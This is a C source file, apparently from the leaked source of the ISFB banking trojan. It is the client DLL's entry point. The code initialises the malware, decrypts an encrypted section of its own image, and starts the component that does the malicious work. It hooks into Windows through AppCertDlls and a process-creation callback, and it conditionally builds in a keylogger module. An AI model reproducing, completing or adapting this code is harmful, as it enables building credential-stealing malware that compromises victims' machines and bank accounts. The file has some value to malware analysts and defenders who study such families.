//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: client.c
// $Revision: 440 $
// $Date: 2014-12-11 18:50:06 +0300 (Чт, 11 дек 2014) $
// description:
//	ISFB client DLL entry point. Library initialization and cleanup routines.


#include "..\common\common.h"
#include "..\config.h"
#include "..\crm.h"
#include "parser.h"
#ifdef _ENABLE_KEYLOG
 #include "..\keylog\keylog.h"
#endif

HANDLE			g_AppHeap = NULL;		// current DLL heap
BOOL			g_IsAppCertDll = FALSE;	// being set to TRUE on any AppCert_DLL call.	
LONG volatile	g_AttachCount = 0;		// number of process attaches

// ----- Function predefinitions ---------------------------------------------------------------------------------------
WINERROR	CrmStartup(PVOID pReserved);
VOID		CrmCleanup(VOID);
WINERROR	CrmStartProcess(VOID);


// Application-defined memory allocation routines to use in common static libraries
PVOID __stdcall	AppAlloc(ULONG Size)
{
	return(hAlloc(Size));
}

VOID __stdcall	AppFree(PVOID pMem)
{
	hFree(pMem);
}

PVOID __stdcall	AppRealloc(PVOID pMem, ULONG Size)
{
	return(hRealloc(pMem, Size));
}

ULONG __stdcall AppRand(VOID)
{
	return(GetTickCount());
}



// ----- DLL startup and cleanup routines -------------------------------------------------------------------------------


//
//	Client DLL initialization routine.
//
static WINERROR ClientStartup(
	HMODULE hModule,	// Current DLL base
	PVOID	pReserved	// Reserved DLL parameter	
	)
{
	WINERROR Status;

	do	// not a loop
	{
		if ((g_AppHeap = HeapCreate(0, 0x400000, 0)) == NULL)
		{
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

#if (defined(_USER_MODE_INSTALL) && !(_INJECT_AS_IMAGE))
		Status = InitGlobals(hModule, G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID | G_CURRENT_MODULE_PATH | G_APP_SHUTDOWN_EVENT | G_CURRENT_PROCESS_PATH);
#else
		Status = InitGlobals(hModule, G_SYSTEM_VERSION | G_CURRENT_PROCESS_ID | G_APP_SHUTDOWN_EVENT | G_CURRENT_PROCESS_PATH);
#endif
		if (Status != NO_ERROR)
			break;

		if ((Status = CsDecryptSection(hModule, 0)) != NO_ERROR)
			break;

		if (PsSupIsWow64Process(g_CurrentProcessId, 0))
			g_CurrentProcessFlags = GF_WOW64_PROCESS;

		Status = CrmStartup(pReserved);
	} while(FALSE);

	return(Status);
}


//
//	Client DLL cleanup routine. 
//	It can be called only if previous ClientStartup() finished successfully.
//
WINERROR ClientCleanup(VOID)
{
	WINERROR Status = NO_ERROR;

	DbgPrint("ISFB_%04x: Cleanup started.\n", GetCurrentProcessId());

	if (g_AppShutdownEvent)
	{
		SetEvent(g_AppShutdownEvent);

		CrmCleanup();
		ReleaseGlobals();
		if (g_AppHeap)
			HeapDestroy(g_AppHeap);
	}	// if (g_AppShutdownEvent)

	return(Status);
}



//
//	Our client DLL entry point.	
//
BOOL APIENTRY DllMain(
	HMODULE	hModule,
    DWORD	ul_reason_for_call,
    LPVOID	lpReserved
	)
{
	BOOL Ret = TRUE;
	WINERROR Status = NO_ERROR;

	switch(ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		if (InterlockedIncrement(&g_AttachCount) == 1)
		{
			DbgPrint("ISFB_%04x: ISFB client DLL version %u.%u, build %u, group %u\n", GetCurrentProcessId(), g_BuildNumber / 100000, (g_BuildNumber % 100000) / 1000, g_BuildNumber % 1000, g_Version);
#ifdef _WIN64
			DbgPrint("ISFB_%04x: Attached to 64-bit process by thread 0x%04x at 0x%x\n", GetCurrentProcessId(), GetCurrentThreadId(), (ULONG_PTR)hModule);
#else
			DbgPrint("ISFB_%04x: Attached to 32-bit process by thread 0x%04x at 0x%x\n", GetCurrentProcessId(), GetCurrentThreadId(), (ULONG_PTR)hModule);
#endif

			if ((Status = ClientStartup(hModule, lpReserved)) != NO_ERROR)
			{
				Ret = FALSE;
				DbgPrint("ISFB_%04x: Startup failed with status %u\n", GetCurrentProcessId(), Status);
			}
		
		}
		break;

	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		if (InterlockedDecrement(&g_AttachCount) == 0)
		{
			ClientCleanup();
#ifdef _WIN64
			DbgPrint("ISFB_%04x: Detached from 64-bit process\n", g_CurrentProcessId);
#else
			DbgPrint("ISFB_%04x: Detached from 32-bit process\n", g_CurrentProcessId);
#endif
		}
		break;
	default:
		ASSERT(FALSE);
		
	}

    return(Ret);
}


// just a stub to bypass CRT entry 
LONG _cdecl main(VOID)
{
}

// Required to link with ntdll.lib
ULONG  __security_cookie;


//
//	Windows defined Process startup notification callback routine
//
NTSTATUS WINAPI CreateProcessNotify(
	LPCWSTR		lpApplicationName, 
	ULONG_PTR	Reason 
	)
{
	if (Reason > 3)
	{
		// Reason is not a reason, but is current module handle, and we were started by the rundll32.
		// We get here after our DllEntry finished successfully, so all globals are initialize.
		HMODULE	hModule = (HMODULE)Reason;
#ifdef _WIN64
		DbgPrint("ISFB_%04x: Started as 64-bit process at 0x%x.\n", GetCurrentProcessId(), (ULONG_PTR)hModule);
#else
		DbgPrint("ISFB_%04x: Started as 32-bit process at 0x%x.\n", GetCurrentProcessId(), (ULONG_PTR)hModule);
#endif

		InterlockedIncrement(&g_AttachCount);
		ASSERT(g_AttachCount > 1);
		CrmStartProcess();
		InterlockedDecrement(&g_AttachCount);
		ASSERT(g_AttachCount > 0);
	}
	else
	{
		DbgPrint("ISFB_%04x: AppCertDll call.\n", g_CurrentProcessId);
		g_IsAppCertDll = TRUE;
	}

	UNREFERENCED_PARAMETER(lpApplicationName);
	return(STATUS_SUCCESS);

}

